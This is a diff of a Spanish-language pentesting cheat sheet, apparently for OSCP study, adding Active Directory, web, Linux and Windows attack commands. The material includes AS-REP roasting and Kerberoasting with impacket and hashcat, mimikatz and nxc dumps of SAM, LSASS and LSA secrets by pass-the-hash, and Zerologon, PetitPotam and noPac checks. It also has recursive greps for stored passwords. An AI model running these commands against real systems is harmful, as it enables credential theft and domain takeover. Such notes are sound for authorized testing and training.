@@ -1,27 +1,59 @@
-
+[chuleta interesante](https://www.emmanuelsolis.com/oscp.html)
 ### 🔐 Active Directory (AD)
 
-#### 🧭 Enumeración con acceso al dominio (PowerView)
-```powershell
-# Dominio:
-Get-Domain | select -ExpandProperty name
-
-# Equipos + IPs para /etc/hosts:
-Get-DomainComputer | select -ExpandProperty name > equipos.txt
-foreach ($equipo in (Get-Content .\equipos.txt)) {$IP = Resolve-DnsName $equipo | select -ExpandProperty ipaddress; echo "$ip $equipo" } 
-
-# Usuarios del dominio:
-Get-DomainUser | select -ExpandProperty sAMAccountName
-
-# Recursos compartidos:
-foreach ($equipo in (Get-Content .\equipos.txt)) {net view \\$equipo}
-```
+#### 🧭 Enumeración con acceso al dominio 
+- PowerView
+	```powershell
+	# Dominio:
+	Get-Domain | select -ExpandProperty name
+	
+	# Equipos + IPs para /etc/hosts:
+	Get-DomainComputer | select -ExpandProperty name > equipos.txt
+	foreach ($equipo in (Get-Content .\equipos.txt)) {$IP = Resolve-DnsName $equipo | select -ExpandProperty ipaddress; echo "$ip $equipo" } 
+	
+	# Usuarios del dominio:
+	Get-DomainUser | select -ExpandProperty sAMAccountName
+	
+	# Recursos compartidos:
+	foreach ($equipo in (Get-Content .\equipos.txt)) {net view \\$equipo}
+	```
+- `ldapsearch`
+	```bash
+	ldapsearch -x -H ldap://dc01 -b "dc=domain,dc=com"
+	# o para búsqueda de información sensible
+	ldapsearch -x -H ldap://dc01 -b "dc=example,dc=local" '(objectClass=*)' | grep -iE 'pass|pwd|description|comment|info'
+	# ejemplo proporcionando credenciales y buscando usuarios con logon script -> scritp que se ejecuta al iniciar sesión
+	ldapsearch -h $target -D "CN=user,DC=domain,DC=local" -w 'password' -b "DC=domain,DC=local" "(scriptPath=*)" sAMAccountName scriptPath
+	```
+- `windapsearch` - menos técnico
+	```bash
+	# se podría omitir usuario y contraseña si no se tiene info
+	python windapsearch.py -d $domain --dc-ip $target -u $username -p $password
+	
+	```
 #### 🦆 [[Miscelaneo#ASREPRoasting| ASReproasting]]
-- Buscar cuentas sin preautenticación Kerberos.
+- Buscar cuentas sin preautenticación Kerberos (con credenciales de usuario)
+	```bash
+	impacket-GetNPUsers -dc-ip $dcip -request -outputfile hash_asreproast $domain/$username:$password
+	```
 - Obtener hashes y crackear (ej. con hashcat).
+	```bash
+	hashcat -m 18200 hash_asreproast /usr/share/wordlists/rockyou.txt 
+	```
 #### 🔥 [[Kerberoasting]]
-- Solicitar TGS de cuentas con SPN.
+- Enumerar SPN.
+	```bash
+	impacket-GetUserSPNs -dc-ip $dcip $domain/$username:$password
+	```
+- Solicitar todos los tickets (obviar `krbtgt`)
+	```bash
+	impacket-GetUserSPNs -dc-ip $dcip $domain/$username -request -outputfile hash_kerberoast
+	```
 - Crackear hash para obtener contraseñas.
+	```
+	hashcat -m 13100 hash_kerberoast /usr/share/wordlists/rockyou.txt
+	```
+
 #### 💀 Null Sessions SMB
 ```bash
 smbclient -N -U "" -L \\$target
@@ -46,12 +78,21 @@ netstat.exe -ano
 # Ekeys (claves de cifrado para Pass-The-Key / DPAPI)
 .\mimikatz.exe privilege::debug sekurlsa::ekeys exit > ekeys.txt
 
-# Tickets (Kerberos TGT/TGS para PTT, silver/golden ticket)
-.\mimikatz.exe privilege::debug sekurlsa::tickets /export exit
-
 # Cache (credenciales de dominio en caché, útiles sin conexión al DC - hay que craquear con hascat -m 2100)
 .\mimikatz.exe privilege::debug lsadump::cache exit > cache.txt
 
+# Tickets (Kerberos TGT/TGS para PTT, silver/golden ticket)
+.\mimikatz.exe privilege::debug sekurlsa::tickets /export exit
+```
+#### nxc
+A veces puede dar información que no da mimikatz
+```bash
+# SAM
+nxc smb $target -u Administrator -H $(cat hashAdmin_gyoza) --sam --local-auth
+# LSASS
+nxc smb $target -u Administrator -H $(cat hashAdmin_gyoza) -M nanodump --local-auth
+# Secrets y más info
+nxc smb $target -u Administrator -H $(cat hashAdmin_gyoza) --lsa --local-auth
 ```
 #### 🗝️ Uso de credenciales
 - PTH, PTT, Pass-the-key, credenciales en texto plano.
@@ -65,7 +106,18 @@ netstat.exe -ano
 #### 📈 BloodHound
 - Recolectar con `SharpHound`.
 - Analizar relaciones para escalada o movimiento lateral.
-
+#### Vulnerabilidades DC
+- Comprobar vulnerabilidades clásicas del DC
+	```bash
+	# Zerologon
+	nxc smb $target -u $username -p $password -M zerologon
+	# Petit-potam -> Ojo! MITM
+	nxc smb $target -u $username -p $password  -M petitpotam 
+	# Nopac
+	nxc smb $target -u $username -p $password  -M nopac
+	```
+#### 🔁 Repetir
+- Cada vez que encontremos un nuevo usuario repetir procesos de enumeración, como mostrar el historial del usuario, carpetas en las que pueda haber información sensible sobre otros usuarios, volver a lanzar winpeas...
 ---
 
 ### 🌐 Pentesting Web - TODO
@@ -75,10 +127,19 @@ netstat.exe -ano
     - `/robots.txt`
     - `/sitemap.xml`
     - comentarios HTML, JavaScript expuesto
+    - `curl -I`
+    - Buscar `Powered by` para versión / buscar info en mouseover en la pestaña de la página
+    - Buscar comentarios `<!--`
 
 #### 🗝️ Credenciales por defecto
 - Revisar en: [https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
-
+#### 🕸 CMS
+Si estamos ante un CMS, debemos preocuparnos por encontrar la siguiente información (normalmente será muy complicado encontrar vulnerabilidades en la propia aplicación)
+- Vulnerabilidades en el propio CMS
+- Vulnerabilidades en plugins, themes
+- Búsqueda de `usernames`
+- Buscar el `github` del propio CMS para encontrar información
+	- `.htacces` ó `web.config`para ver que archivos se permiten mostrar y cuales no
 #### 📂 Fuzzing
 - Directorios con `ffuf`, `gobuster`, `feroxbuster`
 - VHOSTS vía cabeceras `Host:` o DNS bruteforce
@@ -107,7 +168,11 @@ ls -l /etc/passwd /etc/shadow /etc/sudoers
 # Sudo sin contraseña:
 sudo -l
 
-# Binarios SUID/GUID:
+# credenciales por defecto
+su root
+
+# Binarios SUID/GUID: 
+python3 suid3num.py # funciona con python 2
 find / -perm -4000 -type f 2>/dev/null   # SUID
 find / -perm -2000 -type f 2>/dev/null   # GUID
 
@@ -122,6 +187,12 @@ sudo -V | head -n 1
 
 # Variables de entorno:
 env
+
+# Probar snmpwalk 
+snmpwalk -v2c -c public $target NET-SNMP-EXTEND-MIB::nsExtendObjects
+snmpwalk -v2c -c public $target | grep -iE 'pass|pwd|key|user|cred|secret'
+# snmp-check
+snmp-check $target -c public
 ```
 #### 🛠️ Automatización
 - `linpeas.sh`
@@ -143,6 +214,9 @@ grep -ri "password\|passwd\|secret\|token\|key" /home/* 2>/dev/null
 
 # Buscar permisos de escritura globales:
 find / -writable -type f 2>/dev/null
+
+# Buscar usuarios en archivos de logs 
+grep -Fi -f usernames.txt infoLogs
 ```
 #### 📂 Carpetas útiles para chequear manualmente en **Linux** (escalada de privilegios)
 ```bash
@@ -208,11 +282,20 @@ whoami /priv
 	
 	foreach ($group in $groups) { if ($targetGroups -contains $group.Value) { Write-Output "Perteneces a: $($group.Value)" }}
 	```
-- **Administrators**: acceso total.
-- **Backup Operators**: lectura y backup de archivos, incluso protegidos.
-- **Event Log Readers**: acceso a logs con info sensible.
-- **DNS Admins**: potencial RCE en servidores DNS.
-- **Print/Server Operators**: tareas administrativas con potencial de abuso.
+	- **Administrators**: acceso total.
+	- **Backup Operators**: lectura y backup de archivos, incluso protegidos.
+	- **Event Log Readers**: acceso a logs con info sensible.
+	- **DNS Admins**: potencial RCE en servidores DNS.
+	- **Print/Server Operators**: tareas administrativas con potencial de abuso.
+	- Variables de entorno
+	```
+	Get-ChildItem Env:
+	```
+- Historial
+	```powershell
+	# Esto solo muestra el path
+	(Get-PSReadlineOption).HistorySavePath
+	```
 
 #### ⚙️ Permisos débiles
 
@@ -242,6 +325,9 @@ Detectables con herramientas como PowerUp, WinPEAS o manualmente:
 # Buscar archivos no vacíos
 Get-ChildItem -File -Recurse | Where-Object { $_.Length -gt 0 }
 
+# Guardar el contenido de todos los archivos no vacíos en un mismo lugar (útil si son todo archivos de texto)
+Get-ChildItem -File -Recurse | Where-Object { $_.Length -gt 0 } | ForEach-Object { Add-Content -Path "C:\Users\Public\salida.txt" -Value ("`n--- $($_.FullName) ---`n"); Get-Content $_.FullName | Add-Content -Path "C:\Users\Public\salida.txt" }
+
 # Buscar archivos con nombres sugerentes (añadir -File si queremos solo archivos , y quitar el where-object si no queremos):
 Get-ChildItem -Path C:\ -Recurse -Include *.bak,*.old,*.zip,*.rar,*.7z,*.tar,*.gz,*backup*,*copy*,*temp*,*save*,*config*,*test* -ErrorAction SilentlyContinue -Force | Where-Object { $_.FullName -notmatch '^C:\\Windows' -and $_.FullName -notmatch '^C:\\Program Files' -and $_.FullName -notmatch '^C:\\Program Files \(x86\)' }
 
@@ -256,6 +342,10 @@ foreach ($dir in $dirs) { Get-ChildItem -Path $dir.FullName -Recurse -File -Erro
 # Buscar archivos de configuración expuestos:
 Get-ChildItem -Path C:\ -Recurse -Include *.config,*.ini,*.xml -ErrorAction SilentlyContinue -Force
 
+# Buscar usuarios en archivos de logs - >linux
+grep -Fi -f usernames.txt infoLogs
+# o windows -quitar set-content si solo queremos ver por pnatalla
+Select-String -Path "infoLogs.txt" -Pattern (Get-Content usernames.txt) -SimpleMatch | Set-Content coincidencias.txt
 ```
 #### 📂 Carpetas útiles para chequear manualmente en **Windows** (escalada de privilegios)
 
